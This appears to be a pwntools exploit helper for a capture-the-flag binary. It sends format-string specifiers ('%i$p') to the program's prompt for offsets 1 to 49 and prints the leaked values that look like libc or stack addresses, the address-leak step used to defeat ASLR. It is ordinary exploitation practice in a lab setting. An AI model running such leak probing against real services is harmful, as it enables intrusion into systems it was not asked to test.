from pwn import *

context.binary = "./chal"

def run(i):
    io = process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./chal"])
    io.recvuntil(b"What is your favourite pokemon?\n")
    io.sendline(f"%{i}$p".encode())
    io.recvuntil(b"I see you like...\n")
    out = io.recvline().strip()
    io.close()
    return out

for i in range(1, 50):
    out = run(i)
    if out.startswith(b"0x7f"):
        print(i, out.decode())
